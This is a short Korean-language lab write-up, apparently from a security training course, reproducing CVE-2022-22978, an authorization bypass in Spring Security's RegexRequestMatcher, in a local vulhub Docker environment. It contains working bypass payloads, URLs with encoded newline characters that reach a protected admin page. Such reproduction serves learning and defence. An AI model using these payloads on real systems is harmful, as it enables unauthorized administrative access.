# CVE-2022-22978

화이트햇 스쿨 3기 김태우_2249

Spring Security 프레임워크는 Spring 프레임워크에서 보안 인증 기능을 제공하는 데 사용됩니다.
Spring Security 5.5.6 및 5.6.3 버전과 이보다 오래된 지원되지 않는 버전들에서는,
정규 표현식에 .(마침표)가 포함된 **RegexRequestMatcher**를 사용하는 애플리케이션이 인가 우회(authorization bypass) 취약점에 노출될 가능성이 있습니다.

References:

- <https://tanzu.vmware.com/security/cve-2022-22978>
- <https://github.com/DeEpinGh0st/CVE-2022-22978>

## 환경 구성 및 실행

git clone을 통해 vulhub에 있는 필요한 파일들을 다운

![](gitclone.png)

다음과 같은 경로에서 yml 파일을 얻을 수 있음

![](yaml.png)

다음 명령어를 실행하여 Spring Security 5.6.3 기반의 웹 애플리케이션을 시작:

```
docker-compose up -d
```
![](docker.png)

서버 시작 후, <http://your-ip:8080/admin> 를 접속하여 admin 페이지가 막힘을 확인

![](admin_Forbidden.png)

## Vulnerability Reproduce

인증을 우회한 관리자 페이지에 접근하려면 다음 요청을 보냄

- <http://your-ip:8080/admin/%0atest>
- <http://your-ip:8080/admin/%0dtest>

![](admin_Success.png)
